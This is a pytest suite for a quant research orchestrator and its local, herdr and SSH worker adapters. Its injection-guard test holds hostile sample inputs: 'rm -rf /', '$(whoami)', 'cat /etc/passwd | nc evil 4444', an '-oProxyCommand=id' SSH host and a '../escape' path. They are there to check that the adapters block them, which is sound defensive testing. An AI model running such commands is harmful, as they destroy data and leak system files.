"""Comprehensive tests for V3.0 Dual-Mode ClusterResearchOrchestrator, safe adapters, SSE, Memo & Seeder."""

from __future__ import annotations

import importlib
import importlib.util
import json
import sys
import time
from pathlib import Path
from typing import Any

import pytest
from quant_api import deps, jobs
from quant_api.orchestrator import (
    AdapterSecurityError,
    ClusterResearchOrchestrator,
    HerdrHcAdapter,
    LocalSubprocessAdapter,
    SshRunnerAdapter,
    TemplateNotAllowedError,
    WorkerOutputBundle,
    WorkerTaskEnvelope,
    build_sanitized_env,
    ensure_golden_studies,
    get_orchestrator,
    list_cluster_statuses,
    load_cluster_specs,
    render_ic_memo,
    reset_v3_engine_overrides,
    set_orchestrator,
    set_v3_engine_overrides,
)
from quant_core.lake import QuantLake
from quant_core.schemas import (
    ClusterAdapterType,
    ClusterWorkerSpec,
    PublishFindingRequest,
    ResearchDispatchRequest,
)

REPO_ROOT = Path(__file__).resolve().parents[3]


def _load_golden_seeder():
    spec = importlib.util.spec_from_file_location(
        "seed_golden_dataset_orch",
        REPO_ROOT / "scripts" / "seed_golden_dataset.py",
    )
    assert spec is not None and spec.loader is not None
    mod = importlib.util.module_from_spec(spec)
    sys.modules[spec.name] = mod
    spec.loader.exec_module(mod)
    return mod


@pytest.fixture(scope="module")
def golden_lake_fixture(tmp_path_factory: pytest.TempPathFactory) -> tuple[QuantLake, str]:
    base = tmp_path_factory.mktemp("quant_orch_golden")
    root_dir = base / "quant-lake"
    db_path = base / "state" / "quant_registry.db"
    seeder = _load_golden_seeder()
    seeder.seed_golden_lake(root_dir=root_dir, db_path=db_path, export_qlib=False)
    lake = QuantLake(root_dir=root_dir, db_path=db_path)
    return lake, lake.get_latest_snapshot().snapshot_id


@pytest.fixture()
def isolated_env(tmp_path: Path, monkeypatch: pytest.MonkeyPatch, golden_lake_fixture: tuple[QuantLake, str]):
    """Wire a fresh SQLite registry + state store on top of the real Golden PIT lake."""
    src_lake, snap_id = golden_lake_fixture
    fresh_db = tmp_path / "state" / "quant_registry.db"
    fresh_lake = QuantLake(root_dir=src_lake.root_dir, db_path=fresh_db)
    # Recover golden snapshot manifest from disk into fresh registry
    snap = fresh_lake.get_latest_snapshot()
    assert snap.snapshot_id == snap_id

    monkeypatch.setenv("QUANT_STATE_DIR", str(tmp_path / "state"))
    monkeypatch.setenv("QUANT_DATA_ROOT", str(src_lake.root_dir))
    store = jobs.StateStore(tmp_path / "state" / "api.db")
    jobs.set_store(store)
    mgr = jobs.JobManager(store, max_workers=2)
    jobs.set_manager(mgr)
    deps.set_overrides(lake=fresh_lake, engines=None)
    orch = ClusterResearchOrchestrator(registry=fresh_lake.registry, max_workers=2)
    set_orchestrator(orch)
    yield orch, fresh_lake, snap_id
    orch.shutdown()
    mgr.shutdown()
    set_orchestrator(None)
    reset_v3_engine_overrides()
    deps.reset()
    jobs.set_store(None)
    jobs.set_manager(None)


# ---------------------------------------------------------------------------
# 1. Cluster Configuration & Security Hygiene
# ---------------------------------------------------------------------------


def test_cluster_config_defaults_and_env_override(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.delenv("QUANT_CLUSTER_WORKERS", raising=False)
    specs = load_cluster_specs()
    ids = {s.cluster_id for s in specs}
    assert {"engine_sandbox", "ubuntu1_cluster", "herdr_agent"} <= ids

    statuses = list_cluster_statuses()
    by_id = {s.cluster_id: s for s in statuses}
    assert by_id["engine_sandbox"].status == "online"

    # Custom JSON override via QUANT_CLUSTER_WORKERS
    custom = [
        {
            "cluster_id": "ci_sandbox",
            "display_name": "CI Local Sandbox",
            "adapter": "local_subprocess",
            "host": "localhost",
            "agent_cli": "python",
            "capabilities": ["polars"],
            "max_concurrency": 2,
            "workspace_root": "data/sandboxes",
            "allowed_command_templates": ["run_study_script"],
            "enabled": True,
        }
    ]
    monkeypatch.setenv("QUANT_CLUSTER_WORKERS", json.dumps(custom))
    loaded = load_cluster_specs()
    assert len(loaded) == 1 and loaded[0].cluster_id == "ci_sandbox"


# ---------------------------------------------------------------------------
# 2. Safe Adapters: local_subprocess, herdr_hc, ssh_runner & Injection Guards
# ---------------------------------------------------------------------------


def test_local_subprocess_adapter_isolation_env_stripping_and_timeout_kill(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setenv("TUSHARE_TOKEN", "secret-tushare-token")
    monkeypatch.setenv("QUANT_MCP_TOKEN", "secret-mcp-token")
    monkeypatch.setenv("OPENAI_API_KEY", "secret-openai-key")
    monkeypatch.setenv("QUANT_DATA_ROOT", str(tmp_path / "lake"))

    env = build_sanitized_env()
    assert env["QUANT_LAKE_READ_ONLY"] == "1"
    assert "TUSHARE_TOKEN" not in env
    assert "QUANT_MCP_TOKEN" not in env
    assert "OPENAI_API_KEY" not in env

    spec = ClusterWorkerSpec(
        cluster_id="test_local",
        display_name="Test Local",
        adapter=ClusterAdapterType.LOCAL_SUBPROCESS,
        workspace_root=str(tmp_path / "sandboxes"),
        allowed_command_templates=["run_study_script"],
        default_timeout_sec=10,
        max_timeout_sec=15,
    )
    task = WorkerTaskEnvelope(
        study_id="STD-LOCAL-1",
        command_template="run_study_script",
        snapshot_id="snap-test-01",
        title="Local Isolation Test",
        expression="-pl.rolling_corr(close.pct_change(), volume_shares.log1p().diff(), window_size=20)",
        timeout_sec=10,
    )
    adapter = LocalSubprocessAdapter()
    bundle = adapter.launch(spec, task)
    assert bundle.succeeded is True
    assert bundle.exit_code == 0
    assert bundle.worker_claimed_metrics["read_only_lake_enforced"] is True
    assert bundle.worker_claimed_metrics["ast_precheck_safe"] is True
    assert (Path(bundle.sandbox_dir) / "STUDY_BRIEF.json").is_file()

    # Hard timeout enforcement kills process group cleanly
    slow_adapter = LocalSubprocessAdapter(
        argv_builder=lambda _s, _t, _b, _o: [sys.executable, "-c", "import time; time.sleep(15)"]
    )
    slow_task = task.model_copy(update={"study_id": "STD-TIMEOUT-1", "timeout_sec": 1})
    t0 = time.monotonic()
    timed_out_bundle = slow_adapter.launch(spec, slow_task)
    elapsed = time.monotonic() - t0
    assert timed_out_bundle.succeeded is False
    assert timed_out_bundle.timed_out is True
    assert "TIMEOUT" in (timed_out_bundle.error or "")
    assert elapsed < 6.0


def test_herdr_hc_and_ssh_runner_adapters_security_allowlist_and_zero_shell_injection(tmp_path: Path) -> None:
    # 1) HerdrHcAdapter with fake runner verifies argv, read-only lake env, and brief contract
    captured_hc: dict[str, Any] = {}

    def _fake_hc_runner(argv: list[str], cwd: Path, env: dict[str, str], timeout: int) -> tuple[int, str, str]:
        captured_hc["argv"] = argv
        captured_hc["cwd"] = cwd
        captured_hc["env"] = env
        out_path = cwd / "candidate_output.json"
        out_path.write_text(
            json.dumps(
                {
                    "candidate_expression": "-pl.rolling_corr(close.pct_change(), volume_shares.log1p().diff(), window_size=20)",
                    "candidate_factor_id": "alpha_hc_test",
                    "worker_claimed_metrics": {"rank_ic_mean": 0.19, "dsr": 0.999},
                }
            ),
            encoding="utf-8",
        )
        return 0, '{"status": "done"}', ""

    hc_spec = ClusterWorkerSpec(
        cluster_id="ubuntu1_cluster",
        display_name="Primary HC Cluster",
        adapter=ClusterAdapterType.HERDR_HC,
        host="primary-compute-node",
        agent_cli="claude",
        workspace_root=str(tmp_path / "sandboxes"),
        allowed_command_templates=["agent_factor_dev"],
    )
    hc_task = WorkerTaskEnvelope(
        study_id="STD-HC-1",
        command_template="agent_factor_dev",
        snapshot_id="snap-test-01",
        title="HC Test",
        hypothesis="free text with ; rm -rf / && $(whoami)",
    )
    hc_adapter = HerdrHcAdapter(hc_binary="/usr/bin/env", runner=_fake_hc_runner)
    hc_out = hc_adapter.launch(hc_spec, hc_task)
    assert hc_out.succeeded is True
    assert captured_hc["env"]["QUANT_LAKE_READ_ONLY"] == "1"
    assert "--read-only-lake" in captured_hc["argv"]
    # Free-text hypothesis MUST NOT appear anywhere in command argv
    assert not any("rm -rf" in arg or "whoami" in arg for arg in captured_hc["argv"])

    # 2) SshRunnerAdapter rejects unallowlisted templates, bad host, and path traversal
    captured_ssh: dict[str, Any] = {}

    def _fake_ssh_runner(argv: list[str], stdin_data: str, env: dict[str, str], timeout: int) -> tuple[int, str, str]:
        captured_ssh["argv"] = argv
        captured_ssh["stdin"] = stdin_data
        captured_ssh["env"] = env
        return 0, json.dumps({"candidate_expression": "close.pct_change()", "worker_claimed_metrics": {"rank_ic_mean": 0.08}}), ""

    ssh_spec = ClusterWorkerSpec(
        cluster_id="remote_gpu",
        display_name="Remote GPU",
        adapter=ClusterAdapterType.SSH_RUNNER,
        host="gpu-worker-01",
        workspace_root=str(tmp_path / "sandboxes"),
        allowed_command_templates=["run_study_script"],
    )
    ssh_adapter = SshRunnerAdapter(ssh_binary="/usr/bin/ssh", runner=_fake_ssh_runner)
    ssh_task = WorkerTaskEnvelope(
        study_id="STD-SSH-1",
        command_template="run_study_script",
        snapshot_id="snap-test-01",
        title="SSH Test",
        hypothesis="malicious; cat /etc/passwd | nc evil 4444",
    )
    ssh_out = ssh_adapter.launch(ssh_spec, ssh_task)
    assert ssh_out.succeeded is True
    assert captured_ssh["env"]["QUANT_LAKE_READ_ONLY"] == "1"
    assert "BatchMode=yes" in captured_ssh["argv"]
    assert "StrictHostKeyChecking=yes" in captured_ssh["argv"]
    assert not any("passwd" in arg or ";" in arg for arg in captured_ssh["argv"])
    assert "malicious" in captured_ssh["stdin"]  # safely passed via JSON stdin, never shell argv

    # Non-allowlisted command template -> TemplateNotAllowedError
    bad_tmpl_task = ssh_task.model_copy(update={"command_template": "rm_rf_everything"})
    with pytest.raises(TemplateNotAllowedError):
        ssh_adapter.launch(ssh_spec, bad_tmpl_task)

    # Path traversal study_id -> AdapterSecurityError
    bad_id_task = ssh_task.model_copy(update={"study_id": "../escape"})
    with pytest.raises(AdapterSecurityError):
        ssh_adapter.launch(ssh_spec, bad_id_task)

    # SSH option / shell injection host -> AdapterSecurityError
    bad_host_spec = ssh_spec.model_copy(update={"host": "-oProxyCommand=id"})
    with pytest.raises(AdapterSecurityError):
        ssh_adapter.launch(bad_host_spec, ssh_task)

    bad_host_spec2 = ssh_spec.model_copy(update={"host": "node1;whoami"})
    with pytest.raises(AdapterSecurityError):
        ssh_adapter.launch(bad_host_spec2, ssh_task)


# ---------------------------------------------------------------------------
# 3. Mode 1 engine_sandbox End-to-End, State Machine, SSE & IC Memo
# ---------------------------------------------------------------------------


def test_mode1_engine_sandbox_valid_and_falsified_and_duplicate_block_and_memo(isolated_env) -> None:
    orch, _lake, snap_id = isolated_env
    assert get_orchestrator() is orch

    # Invalid state transition is rejected
    study_tmp = orch.get_registry().create_study(study_id="STD-SM", title="SM", snapshot_id=snap_id)
    assert study_tmp.status == "DRAFT"
    with pytest.raises(ValueError, match="Invalid study state transition"):
        orch.transition("STD-SM", "COMPLETED", stage="PUBLISHED", progress_pct=100, message="illegal jump")

    # 1) Valid causal factor end-to-end (real Golden PIT data + real V3 formal/regime/capacity/diagnosis engines)
    req_ok = ResearchDispatchRequest(
        title="量价背离 20D 确定性沙箱实跑",
        hypothesis="测试 CSI500 量价背离 20D 因子在完整 7 步确定性闭环下的表现",
        factor_id="alpha_vp_corr_20d",
        expression="-pl.rolling_corr(close.pct_change(), volume_shares.log1p().diff(), window_size=20)",
        universe_id="CSI500",
        snapshot_id=snap_id,
        bootstrap_b=200,
    )
    resp_ok = orch.dispatch_research(req_ok, async_mode=False)
    assert resp_ok.duplicate_blocked is False
    assert resp_ok.detail is not None
    detail = resp_ok.detail
    assert detail.status in {"COMPLETED", "FALSIFIED"}
    assert detail.formal_proof is not None
    assert detail.formal_proof.proofs_total >= 4
    assert detail.dimension_analysis is not None
    assert len(detail.dimension_analysis.slices) > 0
    assert detail.capacity_frontier is not None
    assert len(detail.capacity_frontier.points) >= 4
    assert detail.fact_fingerprint and len(detail.fact_fingerprint) == 64
    assert len(detail.events) >= 5

    # 5 dimension baselines cached in QuantRegistry
    baselines = orch.get_registry().list_dimension_baselines(snapshot_id=snap_id, universe_id="CSI500")
    assert len(baselines) == 5

    # IC Memo Markdown generation
    memo_md = render_ic_memo(detail)
    assert detail.study_id in memo_md
    assert "Formal Proof Ledger" in memo_md
    assert detail.fact_fingerprint in memo_md
    assert detail.formal_proof.proof_sha256 in memo_md

    # SSE event stream replay & Last-Event-ID (after_seq) resume
    all_frames = list(orch.stream_events(detail.study_id, after_seq=0, replay_only=True))
    assert len(all_frames) == len(detail.events)
    assert all_frames[0].startswith("id: 1\n")
    tail_frames = list(orch.stream_events(detail.study_id, after_seq=len(detail.events) - 1, replay_only=True))
    assert len(tail_frames) == 1
    assert "event: terminal" in tail_frames[0]

    # 2) Look-ahead toxic expression -> FALSIFIED + automatic tombstone + second dispatch blocked!
    req_bad = ResearchDispatchRequest(
        title="前视泄漏反例",
        hypothesis="测试 shift(-1) 未来价格算子拦截",
        factor_id="alpha_toxic_shift",
        expression="close.shift(-1) / close - 1.0",
        universe_id="CSI500",
        snapshot_id=snap_id,
        bootstrap_b=100,
    )
    resp_bad = orch.dispatch_research(req_bad, async_mode=False)
    assert resp_bad.detail is not None
    assert resp_bad.detail.status == "FALSIFIED"
    assert resp_bad.detail.verdict == "FALSIFIED"
    assert resp_bad.detail.formal_proof is not None
    assert resp_bad.detail.formal_proof.passed is False

    tombs = orch.list_tombstones(snapshot_id=snap_id)
    assert any(t.factor_id == "alpha_toxic_shift" for t in tombs)

    # Re-dispatching identical toxic expression is immediately short-circuited by Tier-1 tombstone
    resp_dup = orch.dispatch_research(req_bad, async_mode=False)
    assert resp_dup.duplicate_blocked is True
    assert resp_dup.study.status == "FALSIFIED"
    assert len(resp_dup.tombstone_warnings) >= 1


def test_async_dispatch_and_sse_streaming_and_mode2_zero_trust(isolated_env, tmp_path: Path) -> None:
    orch, _lake, snap_id = isolated_env

    # Async dispatch returns immediately (< 1s) with AsyncJobRecord
    req_async = ResearchDispatchRequest(
        title="异步研究派发与 SSE 流测试",
        hypothesis="异步线程执行并通过 SSE 消费至终态",
        factor_id="alpha_vp_corr_20d",
        expression="-pl.rolling_corr(close.pct_change(), volume_shares.log1p().diff(), window_size=20)",
        universe_id="CSI500",
        snapshot_id=snap_id,
        bootstrap_b=150,
    )
    t0 = time.monotonic()
    resp = orch.dispatch_research(req_async, async_mode=True)
    assert time.monotonic() - t0 < 2.0
    assert resp.job is not None
    assert resp.study.job_id == resp.job.job_id

    # Consume live SSE stream until terminal event
    frames = list(orch.stream_events(resp.study.study_id, after_seq=0, replay_only=False, poll_interval=0.05, max_seconds=30.0))
    assert any("event: terminal" in f for f in frames)
    final_detail = orch.get_study(resp.study.study_id)
    assert final_detail.status in {"COMPLETED", "FALSIFIED"}

    # Mode 2 cluster_dev_worker with fake adapter claiming inflated metrics -> zero-trust re-verification!
    class _FakeClusterAdapter:
        def health_check(self, spec):
            return {"status": "online"}

        def launch(self, spec, task, on_event=None):
            if on_event:
                on_event({"stage": "DEVELOPING", "event_type": "heartbeat", "progress_pct": 22, "message": "fake worker ok"})
            return WorkerOutputBundle(
                worker_run_id="fake-1",
                cluster_id=spec.cluster_id,
                adapter=spec.adapter.value,
                succeeded=True,
                exit_code=0,
                candidate_expression="close.shift(-1) / close - 1.0",
                candidate_factor_id="alpha_fake_inflated",
                worker_claimed_metrics={"rank_ic_mean": 0.35, "dsr": 0.999, "net_excess_ann_pct": 120.0},
            )

        def cancel(self, spec, worker_run_id):
            return True

    orch.set_adapter_override(ClusterAdapterType.HERDR_HC, _FakeClusterAdapter())
    req_m2 = ResearchDispatchRequest(
        title="Mode 2 外部集群零信任复算测试",
        hypothesis="外部集群返回前视因子并虚报超高指标，主控必须推翻",
        dispatch_mode="cluster_dev_worker",
        target_cluster="ubuntu1_cluster",
        universe_id="CSI500",
        snapshot_id=snap_id,
        factor_id="alpha_fake_inflated",
        allow_duplicate=True,
        bootstrap_b=100,
    )
    m2_resp = orch.dispatch_research(req_m2, async_mode=False)
    assert m2_resp.detail is not None
    assert m2_resp.detail.status == "FALSIFIED"
    assert m2_resp.detail.verdict == "FALSIFIED"
    assert "claimed_vs_verified_diff" in m2_resp.detail.metrics_summary


def test_publish_finding_zero_trust_recomputes_and_exposes_discrepancy(isolated_env) -> None:
    orch, _lake, snap_id = isolated_env

    # 1) External worker claims outrageous metrics on a valid expression -> recomputed & diff recorded
    req_valid = PublishFindingRequest(
        title="外部集群上报成果零信任验真",
        worker_cluster_id="remote-gpu-01",
        factor_id="alpha_ext_vp",
        candidate_expression="-pl.rolling_corr(close.pct_change(), volume_shares.log1p().diff(), window_size=20)",
        universe_id="CSI500",
        snapshot_id=snap_id,
        worker_claimed_metrics={
            "rank_ic_mean": 0.45,
            "icir_ann": 9.9,
            "oos_sharpe": 7.5,
            "net_excess_ann_pct": 95.0,
        },
        notes="External agent claimed 95% annual excess return.",
    )
    verified = orch.publish_finding(None, req_valid)
    assert verified.formal_proof is not None
    diff = verified.metrics_summary["claimed_vs_verified_diff"]
    assert diff["rank_ic_mean"]["claimed"] == 0.45
    assert diff["rank_ic_mean"]["verified"] != 0.45
    assert diff["rank_ic_mean"]["discrepancy_flag"] is True
    assert verified.metrics_summary["worker_claimed_metrics"]["net_excess_ann_pct"] == 95.0
    assert len(verified.notes) == 1

    # 2) External worker claims perfection on look-ahead expression -> rejected & tombstoned
    req_leaky = PublishFindingRequest(
        title="外部集群前视泄漏申报",
        worker_cluster_id="remote-gpu-02",
        factor_id="alpha_ext_leaky",
        candidate_expression="close.shift(-2) / close - 1.0",
        universe_id="CSI500",
        snapshot_id=snap_id,
        worker_claimed_metrics={"rank_ic_mean": 0.88, "dsr": 1.0},
    )
    rejected = orch.publish_finding(None, req_leaky)
    assert rejected.status == "FALSIFIED"
    assert rejected.verdict == "FALSIFIED"
    assert rejected.formal_proof is not None and rejected.formal_proof.passed is False
    assert any(t.factor_id == "alpha_ext_leaky" for t in orch.list_tombstones(snapshot_id=snap_id))


def test_graceful_fallback_when_v3_formal_modules_unavailable(isolated_env, monkeypatch: pytest.MonkeyPatch) -> None:
    orch, _lake, snap_id = isolated_env
    real_import = importlib.import_module

    def _blocked_import(name: str, package: str | None = None):
        if name in {
            "quant_core.validation.formal",
            "quant_core.factors.regime",
            "quant_core.risk.capacity",
            "quant_core.validation.diagnosis",
        }:
            raise ImportError(f"simulated missing module: {name}")
        return real_import(name, package)

    monkeypatch.setattr(importlib, "import_module", _blocked_import)
    set_v3_engine_overrides(None)

    req = ResearchDispatchRequest(
        title="回退确定性引擎兼容性测试",
        hypothesis="模拟 v3-formal-engine 尚未就绪时优雅回退至真实确定性计算",
        factor_id="alpha_vp_corr_20d",
        expression="-pl.rolling_corr(close.pct_change(), volume_shares.log1p().diff(), window_size=20)",
        universe_id="CSI500",
        snapshot_id=snap_id,
        bootstrap_b=100,
    )
    resp = orch.dispatch_research(req, async_mode=False)
    assert resp.detail is not None
    assert resp.detail.formal_proof is not None
    assert resp.detail.formal_proof.max_prefix_drift is not None
    assert resp.detail.formal_proof.max_prefix_drift <= 1e-10
    assert resp.detail.dimension_analysis is not None
    assert resp.detail.capacity_frontier is not None
    assert len(orch.get_registry().list_dimension_baselines(snapshot_id=snap_id, universe_id="CSI500")) == 5


def test_ensure_golden_studies_seeds_real_studies_and_is_idempotent(isolated_env) -> None:
    orch, _lake, snap_id = isolated_env

    first = ensure_golden_studies(snap_id, universe_id="CSI500", orchestrator=orch)
    assert first["seeded"] is True
    assert first["study_ids"] == ["STD-0001", "STD-0002", "STD-0003"]
    assert first["baseline_count"] == 5
    assert first["tombstone_count"] >= 1

    s1 = orch.get_study("STD-0001")
    s2 = orch.get_study("STD-0002")
    s3 = orch.get_study("STD-0003")

    assert s1.parent_study_id is None
    assert s2.parent_study_id == "STD-0001"
    assert s3.parent_study_id == "STD-0001"
    assert s3.status == "FALSIFIED"
    assert s3.verdict == "FALSIFIED"
    assert s1.formal_proof is not None
    assert s2.formal_proof is not None
    assert s3.formal_proof is not None and s3.formal_proof.passed is False
    assert [n.study_id for n in s2.lineage] == ["STD-0001", "STD-0002", "STD-0003"]

    # Second call MUST be strictly idempotent (no duplicate studies)
    second = ensure_golden_studies(snap_id, universe_id="CSI500", orchestrator=orch)
    assert second["seeded"] is False
    assert second["baseline_count"] == 5
    assert len(orch.list_studies(snapshot_id=snap_id)) == 3
